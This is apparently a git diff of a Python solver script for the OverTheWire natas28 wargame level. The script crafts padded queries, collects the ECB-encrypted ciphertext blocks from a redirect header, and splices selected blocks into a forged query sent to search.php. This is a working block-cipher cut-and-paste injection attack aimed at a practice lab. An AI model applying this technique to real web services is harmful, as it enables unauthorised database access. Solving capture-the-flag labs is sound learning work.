@@ -1,4 +1,5 @@
 from urllib.parse import unquote
+from urllib.parse import quote
 import base64
 import sys
 import subprocess
@@ -16,7 +17,7 @@ def find_query():
     charr = get_padding(bytes(sys.argv[1].encode()))
     payload.extend(charr)
     print(payload)
-    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php/', auth=auth, data={b'query':bytes(payload)}, allow_redirects=False)
+    r = requests.get('http://natas28.natas.labs.overthewire.org/index.php/', auth=auth, params={b'query':bytes(payload)}, allow_redirects=False)
     query = r.headers['Location']
     return query[18:]
 
@@ -44,10 +45,18 @@ def split_newline(response):
             s += str(i) + ": " + response[32*i:32*i+32] + "\n"
     else:
         for i in range(0, int(length/32)):
-            if i > 2 and i < int(length/32)-3:
+            if i > 2 and i < int(length/32)-2:
                 s += response[32*i:32*i+32]
     return s
+def get_response(query):
+    print(query)
+    payload = bytes.fromhex(query)
+    payload = base64.b64encode(payload)
+    print(bytes(payload))
+    r = requests.get('http://natas28.natas.labs.overthewire.org/search.php/', auth=auth, params={b'query':bytes(payload)}, allow_redirects=False)
+    response = r.text
+    return response.split("\n", 14)[14]
 
 if __name__ == '__main__':
-    print(split_newline(url_base64_to_hex(find_query())))
+    print(get_response(split_newline(url_base64_to_hex(find_query()))))
 
